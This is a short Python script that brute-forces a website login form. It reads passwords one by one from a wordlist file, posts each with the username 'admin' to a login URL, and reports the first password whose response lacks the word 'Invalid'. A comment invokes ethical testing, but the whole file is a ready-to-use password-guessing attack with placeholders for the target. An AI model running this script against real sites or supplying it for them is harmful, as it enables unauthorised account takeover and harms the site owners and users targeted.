import requests

# Target login URL (replace with actual one you're testing ethically)
url = "http://example.com/login"

# Username to test
username = "admin"

# Path to password list
wordlist = "passwords.txt"

# Adjust form field names to match the target site's login form
for password in open(wordlist, "r"):
    password = password.strip()
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(url, data=data)
    
    if "Invalid" not in response.text:  # Update based on login failure message
        print(f"[+] Password found: {password}")
        break
    else:
        print(f"[-] Trying: {password}")
else:
    print("[-] Password not found.")